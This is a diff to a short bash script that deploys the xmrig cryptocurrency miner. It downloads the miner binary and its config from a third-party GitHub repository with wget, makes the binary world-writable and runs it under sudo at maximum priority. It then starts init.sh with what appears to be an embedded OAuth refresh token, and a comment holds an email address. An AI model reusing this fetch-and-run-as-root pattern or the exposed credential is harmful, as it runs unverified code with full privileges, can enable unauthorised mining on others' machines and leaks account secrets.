@@ -1,7 +1,17 @@
 #!/bin/bash
 
+path=$(pwd)
+
 sudo pkill xmrig
-sudo nice -n -20 /home/XXXXXXXXXXXXXX/xmrig-6.12.1/xmrig
+
+rm -rf xmrig && wget -q https://github.com/Predador21/files/raw/main/xmrig && chmod 777 xmrig
+rm -rf config.json && wget -q https://raw.githubusercontent.com/Predador21/files/main/config.json
+
+sudo nice -n -20 ./xmrig
+
+#g189e53@gmail.com
 
 sudo pkill init.sh
 sudo ./init.sh 1//0dQukGeNaC3WZCgYIARAAGA0SNwF-L9IryL_WU_Zz2KF0BQZp-4EmlJcdzvBJ496y2skxrRA7R1HU3TP6C9Y0KA3sf0YX-rXwTwk >> LOG
+
+
